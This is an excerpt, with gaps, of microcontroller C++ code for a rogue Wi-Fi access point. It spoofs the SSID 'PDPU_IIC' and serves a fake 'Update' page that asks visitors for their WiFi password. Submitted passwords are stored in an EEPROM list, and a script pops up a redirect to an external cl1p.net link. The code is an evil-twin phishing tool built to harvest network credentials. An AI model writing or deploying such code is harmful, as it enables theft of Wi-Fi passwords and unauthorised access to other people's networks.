...
// Default SSID name
const char* SSID_NAME = "PDPU_IIC";

// Default main strings
#define SUBTITLE "Router info."
#define TITLE "Update"
#define BODY "Wifi is hacked By Blackeyes"
...
IPAddress APIP(192, 168, 1, 12); // Gateway
...
String index() {
  String popupScript = "<script type=\"text/javascript\">"
                      ...
                      "    if(confirm('Click OK to visit the specific link.')) {"
                      "      window.location.href = 'https://cl1p.net/sanambewafa';"
                      "    }"
                      "  };"
                      "</script>";

  return header(TITLE) + popupScript +
         "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>" +
...
String postedSSID() {
  ...
  return header("SSID Changed") + "<p>New SSID: " + postedSSID + "</p>" + footer();
}
...
String clear() {
  ...
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:red\" href=/>Back to Index</a></center>" + footer();
}
